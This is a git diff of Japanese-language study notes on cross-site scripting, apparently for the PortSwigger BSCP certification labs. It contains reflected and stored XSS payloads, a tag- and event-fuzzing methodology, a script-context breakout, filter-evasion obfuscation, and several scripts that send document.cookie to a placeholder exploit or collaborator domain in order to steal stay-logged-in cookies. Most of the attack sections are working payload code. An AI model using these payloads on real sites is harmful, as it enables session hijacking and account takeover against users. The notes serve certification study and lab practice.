@@ -293,8 +293,7 @@ body:document.cookie
 
 ## 基本ペイロード早見表
 
-**Reflected XSS：**
-
+Reflected XSS：
 ```html
 <!-- ユーザー操作不要 -->
 <iframe src="https://<target_ip>?<vuln_param>=<payload>">
@@ -305,8 +304,7 @@ location = 'https://<target_ip>?<vuln_param>=<payload>'
 </script>
 ```
 
-**Stored XSS：**
-
+Stored XSS
 ```html
 <script>alert(1)</script>
 ```
@@ -318,155 +316,10 @@ location = 'https://<target_ip>?<vuln_param>=<payload>'
 ## Stay-logged-in Cookieの取得
 
 1. Comment機能の特定パラメータに以下を注入する
-
 ```js
 <script>
-    document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
+    document.location='https://<target_IP>/c='+document.cookie
 </script>
 ```
 
 2. エクスプロイトサーバのAccess Logを確認しCookieを入手する
-
-
----
----
-
-
-## HTMLタグ内でのXSS
-
-##### 🚨：HTMLタグ内でのXSSペイロード注入時の注意点
-
-- HTML内に注入される時、タグは`>`だけで閉じることができる
-```html
-<h1>0 search results for 'ユーザの入力'</h1>
-```
-のとき、
-```
-"><body onresize=print()>"
-```
-
----
-### HTMLタグ内のXSSメソドロジー
-
-1. 有効なtagを割り出す。[xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてPayload settingsにペースト
-```http
-GET /?search=<§§> HTTP/2
-...
-```
-
-2. 有効なeventを割り出す。cheat sheetのCopy events to clipboardしてペースト(`%20`=空白)
-```http
-GET /?search=<有効なタグ%20§§=1> HTTP/2
-...
-```
-
-3. [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なpayload候補を取得する。
-4. コンテキストに合わせ改変したペイロードをエクスプロイトサーバにホストしてView Exploitで検証する[4. XSS contexts](#🚨：HTMLタグ内でのXSSペイロード注入時の注意点)
-```html
-<iframe src="https://0a4b003c0362b495817bca6e00b4007f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-```
-
----
-#### すべてのタグが禁止されている場合
-
-すべて禁止されてはないけどXSS cheat sheetに有効そうなタグがないときも
-
-- custom tagを使用する
-- エクスプロイトサーバにホストしdeliver
-```html
-<script>
-	location = 'https://TARGET_NET/?search=<xss+id=x+onfocus=document.location='https://COLLABORATOR_DOMAIN/?c='+document.cookie tabindex=1>#x';
-</script>
-```
-
----
-
-## JavaScriptへのXSS
-
-### 既存のスクリプトを強制終了させ任意のJSを実行する方法
-
-1. スクリプト内にユーザが制御可能(入力等)な値が存在する箇所を見つける
-```js
-<script> 
-... var input = 'ここに入力'; 
-... 
-</script>
-```
-
-2. 既存のスクリプトを閉じさせてペイロードを注入する
-```js
-</script><img src=1 onerror=alert(document.cookie)>
-```
-
----
-
-
----
-
----
-## Misc
-
-###### 難読化
-
-```js
-<img src=1 onerror=alert(1)>
-```
-	↓
-```js
-<img src=1 oNeRrOr=alert`1`)
-```
-- alertはテンプレートリテラルを使用。alertという関数の引数としてバッククウォートで囲まれた1を渡す
-
-- その他 [XSS cheat sheet Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation:~:text=27%27%3B%22%3EXSS%3C/a%3E-,Obfuscation,-Data%20protocol%20inside)
-- [OWASP XSS Filter Evasion](### Filter Bypass Alert Obfuscation[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#filter-bypass-alert-obfuscation "Permanent link"))
-
-###### クエリストリングへの埋め込み
-
-```http
-/any?xss='><script>alert(1)</script>
-```
-
-###### もしURLエンコードされて実行されないならWebキャッシュポイズニング
-
-- [3. 実装の欠陥の悪用](../../../BSCP/Advanced/Web%20cache%20poisoning/4.%20キャッシュ実装の欠陥の悪用/3.%20実装の欠陥の悪用.md#正規化されたCache%20keyの悪用)
-
-###### Stay-logged-in Cookieを取得
-
-1. Comment機能の特定パラメタに以下のスクリプトを注入
-```js
-<script>
-	document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
-</script>
-```
-
-2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する
-
----
-
-
----
-## Misc
-
-###### Reflected XSS基本payload
-
-1. no user interaction in HTML
-```html
-<iframe src="https://TARGET_NET?[vuln_param]=[payload]">
-```
-![[Pasted image 20240218101126.png | 50]]↓
-
-2. need user interaction(iframeは禁止されているからこれでうまくいくことが多い)
-```html
-<script>
-location = 'https://<target_ip>?[vuln_param]=[payload]'
-</script>
-```
-
-###### Stored XSS基本payload
-```js
-<script>alert(1)</script>
-```
-
-```html
-<img src=1 onerror=alert(1)>
-```
